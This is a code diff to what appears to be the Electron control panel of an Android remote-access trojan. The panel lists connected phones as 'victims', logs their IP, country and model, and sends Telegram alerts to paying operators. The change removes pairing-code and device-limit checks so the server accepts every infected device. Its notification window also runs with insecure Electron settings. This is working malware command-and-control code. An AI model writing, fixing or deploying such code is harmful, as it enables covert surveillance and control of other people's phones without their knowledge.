@@ -711,121 +711,81 @@ ipcMain.on('SocketIO:Listen', function (event, port) {
       console.log(`   IP: ${ip}`);
 
       // ========================================
-      // PAIRING CODE VALIDATION
+      // TERIMA SEMUA KONEKSI DULU (NO PAIRING CODE CHECK)
       // ========================================
-      const pairingCode = query.pairing_code;
-      
-      if (!pairingCode) {
-        console.log('   ❌ No pairing code provided');
-        socket.emit('error', { message: 'Pairing code required' });
-        socket.disconnect();
-        return;
-      }
-
-      console.log(`   Pairing Code: ${pairingCode}`);
-
-      const pairingData = await getPairingCode(pairingCode);
-      
-      if (!pairingData) {
-        console.log('   ❌ Invalid or expired pairing code');
-        socket.emit('error', { message: 'Invalid or expired pairing code' });
-        socket.disconnect();
-        return;
-      }
-
-      console.log(`   ✅ Valid pairing code for Telegram ID: ${pairingData.telegram_id}`);
-
-      // Check device limit
-      const existingDevices = await getDevicesByTelegramId(pairingData.telegram_id);
-      const maxDevices = pairingData.users === 0 ? Infinity : parseInt(pairingData.users);
-      
-      if (existingDevices.length >= maxDevices) {
-        console.log(`   ❌ Device limit reached: ${existingDevices.length}/${maxDevices}`);
-        socket.emit('error', { message: 'Device limit reached' });
-        socket.disconnect();
-        return;
-      }
-
-      // Mark as used and add device
-      await usePairingCode(pairingCode, index);
       const deviceName = `${query.manf} ${query.model}`;
-      await addDevice(pairingData.subscription_id, pairingData.telegram_id, index, deviceName);
+      
+      // Check if device already paired in database
+      const checkDevice = victimsList.getDeviceInfo?.(index) || null;
 
-      console.log(`   ✅ Device paired successfully!`);
-      console.log(`   Owner: ${pairingData.telegram_id}`);
-      console.log(`   Devices: ${existingDevices.length + 1}/${maxDevices === Infinity ? 'unlimited' : maxDevices}`);
-
-      // Add to victims list
+      // Add to victims list (TERIMA SEMUA KONEKSI)
       victimsList.addVictim(socket, ip, address.remotePort, country, query.manf, query.model, query.release, query.id);
 
-      // Send Telegram notification
-      await sendTelegramMessage(pairingData.telegram_id, `
-🎉 *New Device Connected!*
+      // Notification window (hanya untuk yang sudah paired)
+      if (checkDevice) {
+        let notification = new BrowserWindow({
+          frame: false,
+          x: display.bounds.width - 280,
+          y: display.bounds.height - 78,
+          show: false,
+          width: 280,
+          height: 78,
+          resizable: false,
+          skipTaskbar: true,
+          alwaysOnTop: true,
+          webPreferences: {
+            nodeIntegration: true,
+            enableRemoteModule: true,
+            contextIsolation: false
+          }
+        });
 
-📱 Device: ${deviceName}
-🆔 ID: \`${index}\`
-🌍 IP: ${ip}
-📍 Country: ${country || 'Unknown'}
-📅 Time: ${new Date().toLocaleString('id-ID')}
+        notification.webContents.on('did-finish-load', function () {
+          notification.show();
+          setTimeout(function () { notification.destroy() }, 3000);
+        });
 
-Gunakan /victims untuk melihat devices online.
-      `);
-
-      // Notification window
-      let notification = new BrowserWindow({
-        frame: false,
-        x: display.bounds.width - 280,
-        y: display.bounds.height - 78,
-        show: false,
-        width: 280,
-        height: 78,
-        resizable: false,
-        skipTaskbar: true,
-        alwaysOnTop: true,
-        webPreferences: {
-          nodeIntegration: true,
-          enableRemoteModule: true,
-          contextIsolation: false
-        }
-      });
-
-      notification.webContents.on('did-finish-load', function () {
-        notification.show();
-        setTimeout(function () { notification.destroy() }, 3000);
-      });
-
-      notification.webContents.victim = victimsList.getVictim(index);
-      notification.loadFile(path.join(__dirname, 'app/notification.html'));
+        notification.webContents.victim = victimsList.getVictim(index);
+        notification.loadFile(path.join(__dirname, 'app/notification.html'));
+      }
 
       win.webContents.send('SocketIO:NewVictim', index);
 
-      // Auto update last active
-      const activeInterval = setInterval(async () => {
-        await updateDeviceLastActive(index);
-      }, 30000);
-
-      socket.on('disconnect', async function () {
-        clearInterval(activeInterval);
-        victimsList.rmVictim(index);
-        
-        // Update status to inactive
-        try {
+      // Auto update last active (hanya untuk yang sudah paired)
+      let activeInterval = null;
+      if (checkDevice) {
+        activeInterval = setInterval(async () => {
           await db.execute(
-            'UPDATE devices SET status = "inactive" WHERE device_id = ?',
+            'UPDATE devices SET last_active = NOW() WHERE device_id = ?',
             [index]
           );
-        } catch (error) {
-          console.error('Error updating device status:', error);
-        }
+        }, 30000);
+      }
 
-        // Send disconnect notification
-        await sendTelegramMessage(pairingData.telegram_id, `
+      socket.on('disconnect', async function () {
+        if (activeInterval) clearInterval(activeInterval);
+        victimsList.rmVictim(index);
+        
+        // Update status to inactive (hanya untuk yang sudah paired)
+        if (checkDevice) {
+          try {
+            await db.execute(
+              'UPDATE devices SET status = "inactive" WHERE device_id = ?',
+              [index]
+            );
+          } catch (error) {
+            console.error('Error updating device status:', error);
+          }
+
+          // Send disconnect notification
+          await sendTelegramMessage(checkDevice.telegram_id, `
 ⚠️ *Device Disconnected*
 
-📱 Device: ${deviceName}
+📱 Device: ${checkDevice.device_name || deviceName}
 🆔 ID: \`${index}\`
 📅 Time: ${new Date().toLocaleString('id-ID')}
-        `);
+          `);
+        }
 
         win.webContents.send('SocketIO:RemoveVictim', index);
         
@@ -836,7 +796,7 @@ Gunakan /victims untuk melihat devices online.
       });
     });
 
-    event.reply('SocketIO:Listen', '[✓] Started Listening on Port: ' + port + ' (with Pairing Code validation)');
+    event.reply('SocketIO:Listen', '[✓] Started Listening on Port: ' + port + ' (accepting all connections)');
     listeningStatus[port] = true;
     
   } catch (error) {
